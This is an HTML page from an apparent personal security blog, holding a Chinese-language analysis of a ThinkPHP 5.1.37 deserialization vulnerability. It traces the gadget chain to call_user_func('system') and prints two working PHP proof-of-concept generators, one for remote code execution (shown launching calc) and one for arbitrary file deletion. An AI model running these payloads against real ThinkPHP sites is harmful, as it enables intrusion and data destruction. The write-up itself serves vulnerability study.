@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lnva9say.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="喜时之言多少失信">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP5.1反序列化漏洞分析">
+<meta property="og:url" content="https://lnva9say.top/2020/03/19/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="baishuo">
+<meta property="og:description" content="喜时之言多少失信">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/1.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/2.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/3.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/4.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/5.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/6.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/7.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/8.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/9.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/10.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/11.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/78.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/74.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/57.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/936.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/3843.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/7416.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/40120.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/28859.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/3018021.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/602730.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/image-20200320161016699.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200320161119055.png">
+<meta property="og:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/0200320161103583.png">
+<meta property="article:published_time" content="2020-03-19T11:46:11.000Z">
+<meta property="article:modified_time" content="2020-04-18T09:55:23.435Z">
+<meta property="article:author" content="baishuo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://baishuo.oss-cn-beijing.aliyuncs.com/img/1.png">
+
+<link rel="canonical" href="https://lnva9say.top/2020/03/19/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>TP5.1反序列化漏洞分析 | baishuo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">baishuo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lnva9say.top/2020/03/19/TP5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/baishuo.jpg">
+      <meta itemprop="name" content="baishuo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baishuo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TP5.1反序列化漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-19 19:46:11" itemprop="dateCreated datePublished" datetime="2020-03-19T19:46:11+08:00">2020-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-18 17:55:23" itemprop="dateModified" datetime="2020-04-18T17:55:23+08:00">2020-04-18</time>
+              </span>
+
+          
+            <div class="post-description">喜时之言多少失信</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>composer create-project topthink/think=5.1.37 tp5.1x</p>
+<h2 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h2><p>几个魔法函数：</p>
+<figure class="highlight plain"><figcaption><span>构造函数每次创建对象都会调用此方法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;__destruct&#96;&#96;&#96; 某个对象引用被删除和对象被销毁时执行</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;__wakeupunserialize()&#96;&#96;&#96; 检查是否存在wakeup()方法，如果存在调用</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;__toString&#96;&#96;&#96; 一个对象被当字符串使用执行这个对象的&#96;&#96;&#96;__tostring</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><figcaption><span>字符串或对象被序列化，属性不修改，不执行。当序列化字符串属性个数的值大于真实个数的属性时会跳过__wakeup的执行，反序列化时会执行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## POC</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append &#x3D; [];</span><br><span class="line">    private $data &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;append &#x3D; [&quot;lin&quot;&#x3D;&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];</span><br><span class="line">        $this-&gt;data &#x3D; [&quot;lin&quot;&#x3D;&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">    protected $hook &#x3D; [];</span><br><span class="line">    protected $filter &#x3D; &quot;system&quot;;</span><br><span class="line">    protected $config &#x3D; [</span><br><span class="line">        &#x2F;&#x2F; 表单ajax伪装变量</span><br><span class="line">        &#39;var_ajax&#39;         &#x3D;&gt; &#39;_ajax&#39;,</span><br><span class="line">    ];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter &#x3D; &quot;system&quot;;</span><br><span class="line">        $this-&gt;config &#x3D; [&quot;var_ajax&quot;&#x3D;&gt;&#39;lin&#39;];</span><br><span class="line">        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\concern\Conversion;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/1.png" alt=""></p>
+<h2 id="漏洞分析过程"><a href="#漏洞分析过程" class="headerlink" title="漏洞分析过程"></a>漏洞分析过程</h2><p>​    从/thinkphp/library/think/process/pipes/Windows.php下的<code>__destruct()</code>方法来开始分析</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/2.png" alt=""></p>
+<p>方法中调用了两个函数，一个是关闭方法，再一个就是删除临时文件函数。 跟进方法</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/3.png" alt=""></p>
+<p>变量$file 可控 同时存在任意文件删除漏洞， exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="string">'C:\FakeD\Software\phpstudy\PHPTutorial\WWW\shell.php'</span>];</span><br><span class="line">        <span class="comment">//需要删除文件的路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>
+
+<p>$filename变量被当作字符串处理，从而触发tostring模仿方法，跟进</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/4.png" alt=""></p>
+<p>调用 toJson()方法 ，转换为json字符串</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/5.png" alt=""></p>
+<p>调用toArray() 跟进  定位到</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/6.png" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-append 可控</span><br></pre></td></tr></table></figure>
+
+<p>遍历 append键名及属性</p>
+<p>由于append可控，则$relation可控。</p>
+<p>跟进getRelation()方法和getAttr()方法.</p>
+<p>执行条件，控制$relation变量以后 我们只需要找到一个不存在visible方法的类及该类存在__call()魔法方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$relation-&gt;visible($name)</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/7.png" alt=""></p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/8.png" alt=""></p>
+<p>跟进 getDate方法</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/9.png" alt=""></p>
+<p>回到 toArray()</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/10.png" alt=""></p>
+<p>看到$relation-&gt;visible($name);  需要一个__call代码执行点</p>
+<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1、没有visible方法的类</p>
+<p>2、类中实现了__call方法</p>
+<p>3、__call_user_func</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/11.png" alt=""></p>
+<p>this-&gt;hook[$method]我们可控 但是array_unshift函数把request对象插入到数组的开头。</p>
+<p>导致构造不出来参数可用的payload 。</p>
+<p>回溯</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/78.png" alt=""></p>
+<p>该方法调用了call_user_func函数，但$value不可控，发现input() 调用了filterValue 跟进</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/74.png" alt=""></p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/57.png" alt=""></p>
+<p>这里的filterValue回调函数参数不可控不能直接用</p>
+<p>继续回溯找到param函数</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/936.png" alt=""></p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/3843.png" alt=""></p>
+<p>这里调用了input()函数，不过参数仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/7416.png" alt=""></p>
+<p>函数中  $this-&gt;config[‘var_ajax’]<code>，</code>$this-&gt;config[‘var_ajax’] 可控，则param函数中$name可控，input函数 $name可控。</p>
+<p>而param函数可以获得<code>$_GET数组</code>并赋值给<code>$this-&gt;param</code></p>
+<p>回到 input函数</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/40120.png" alt=""></p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/28859.png" alt=""></p>
+<p>$data的值来自于getData   $name值来自于 $this-&gt;config[‘var_ajax’],跟进getData</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/3018021.png" alt=""></p>
+<p>这里<code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure>
+
+<p>跟进</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/602730.png" alt=""></p>
+<p>$filter 可控   我们可以定义一个带有<code>$this-&gt;filter</code>的函数</p>
+<h3 id="此时可得出-在input函数中的回调函数filterValue-value的值为第一个通过GET请求的值input-data，而filterValue-key为GET请求的键input-name，并且filterValue-filters就等于input-filter的值。"><a href="#此时可得出-在input函数中的回调函数filterValue-value的值为第一个通过GET请求的值input-data，而filterValue-key为GET请求的键input-name，并且filterValue-filters就等于input-filter的值。" class="headerlink" title="此时可得出 在input函数中的回调函数filterValue.value的值为第一个通过GET请求的值input.data，而filterValue.key为GET请求的键input.name，并且filterValue.filters就等于input.filter的值。"></a>此时可得出 在input函数中的回调函数<code>filterValue.value</code>的值为第一个通过GET请求的值<code>input.data</code>，而<code>filterValue.key</code>为GET请求的键<code>input.name</code>，并且<code>filterValue.filters</code>就等于<code>input.filter</code>的值。</h3><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p>1、在toArray()方法，创建一个Request()对象，去到requests类</p>
+<p>2、然后触发 new Request() -&gt; visible($name)调用一个不存在的方法 触发__call方法</p>
+<p>3、call方法中然后紧接着跟进isAjax方法($this-&gt;config[‘var_ajax’] 可控)</p>
+<p>4、跟进param()方法  return $this-&gt;input($this-&gt;param, $name, $default, $filter);  </p>
+<p>$name = $this-&gt;config[‘var_ajax’] 、 $this-&gt;param当前get请求参数数组、</p>
+<p>5、跟进input()方法，跟进函数 getData  分割数组 返回$data=$data[$val]</p>
+<p>跟进函数getFilter  返回$filter[0=&gt;’system’,1=&gt;$default]</p>
+<p>回调函数filterValue ，跟进该函数，</p>
+<p>$data = filterValue.$value = calc </p>
+<p>$filter = filterValue.$filters = [0-&gt;system,1-&gt;$default] </p>
+<p>$name = filterValue.$key = ‘lin’</p>
+<p>删除数组最后哟个元素，此时$filters=$filter[0]=system</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = call_user_func($filter, $value);    <span class="comment">//执行回调函数system('calc');</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在public/index.php处可设一个触发点</p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/image-20200320161016699.png" alt=""></p>
+<p>最终在filterValue()方法处执行系统命令导致RCE。</p>
+<h4 id="附上其他师傅的pop链"><a href="#附上其他师傅的pop链" class="headerlink" title="##附上其他师傅的pop链"></a>##附上其他师傅的pop链</h4><p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/20200320161119055.png" alt=""></p>
+<p><img src="https://baishuo.oss-cn-beijing.aliyuncs.com/img/0200320161103583.png" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6619" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619</a></p>
+<p><a href="https://wulidecade.cn/2019/10/06/tp5-1-X反序列化漏洞分析/#more" target="_blank" rel="noopener">https://wulidecade.cn/2019/10/06/tp5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/20/TP5-2x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="TP5.2x反序列化漏洞分析">
+      TP5.2x反序列化漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php反序列化漏洞"><span class="nav-number">2.</span> <span class="nav-text">php反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用链"><span class="nav-number">3.</span> <span class="nav-text">调用链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析过程"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件"><span class="nav-number">5.</span> <span class="nav-text">条件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#此时可得出-在input函数中的回调函数filterValue-value的值为第一个通过GET请求的值input-data，而filterValue-key为GET请求的键input-name，并且filterValue-filters就等于input-filter的值。"><span class="nav-number">5.1.</span> <span class="nav-text">此时可得出 在input函数中的回调函数filterValue.value的值为第一个通过GET请求的值input.data，而filterValue.key为GET请求的键input.name，并且filterValue.filters就等于input.filter的值。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POP链"><span class="nav-number">6.</span> <span class="nav-text">POP链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#附上其他师傅的pop链"><span class="nav-number">6.0.1.</span> <span class="nav-text">##附上其他师傅的pop链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baishuo"
+      src="/images/baishuo.jpg">
+  <p class="site-author-name" itemprop="name">baishuo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">baishuo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
